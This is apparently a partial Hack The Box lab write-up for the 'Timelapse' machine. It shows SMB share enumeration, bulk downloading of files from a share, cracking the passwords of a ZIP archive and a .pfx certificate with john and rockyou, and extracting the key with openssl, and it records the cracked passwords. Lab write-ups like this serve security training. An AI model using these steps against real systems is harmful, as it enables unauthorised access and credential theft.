## Info

### Credential

| User | Password      | Service              | Note |
| ---- | ------------- | -------------------- | ---- |
|      | supremelegacy | winrm_backup.zip     |      |
|      | thuglegacy    | legacyy_dev_auth.pfx |      |

### SMB shares

```bash
ice1187@ice1187-lab:~/repo/htb/timelapse$ smbclient -L $ip
Enter WORKGROUP\ice1187's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

## Path

### User

1. With `enum4linux-ng`, we can find the domain is `timelapse.htb` and get the shares access permission.

```bash
$ enum4linux-ng -u ice1187 -A timelapse.htb
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[-] Could not parse result of smbclient command, please open a GitHub issue
[*] Testing share SYSVOL
[-] Could not parse result of smbclient command, please open a GitHub issue
[*] Testing share Shares
[+] Mapping: OK, Listing: OK
```

2. Download all the files from `Shares` share.

```
$ smbclient -U ice1187 //timelapse.htb/Shares
Enter WORKGROUP\ice1187's password:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

3. Brute force the password of `Shares/Dev/winrm_backup.zip`, and extract the file `legacyy_dev_auth.pfx`.

```
$ john --format=PKZIP --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ./winrm_backup.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-04-18 19:38) 4.000g/s 13877Kp/s 13877Kc/s 13877KC/s surken201..suppamart
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

4. Read `.pfx` file

```
$ openssl pkcs12 -info -in legacyy_dev_auth.pfx
Enter Import Password:
$ /opt/john/run/pfx2john.py ./legacyy_dev_auth.pfx > ./legacyy_dev_auth.john
$ john --format=pfx --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ./legacyy_dev_auth.john
...
thuglegacy       (legacyy_dev_auth.pfx)
$ openssl pkcs12 -nodes -info -in legacyy_dev_auth.pfx -out ./legacyy_dev_auth.txt
```

5. All the files in `smb/HelpDesk/` are the same as those downloaded from [Microsoft Website](https://www.microsoft.com/en-us/download/details.aspx?id=46899).

\*\*TODO:

1. What can .pfx file do? => Winrm auth?
2. What can the files under smb/HelpDesk do? => Nothing
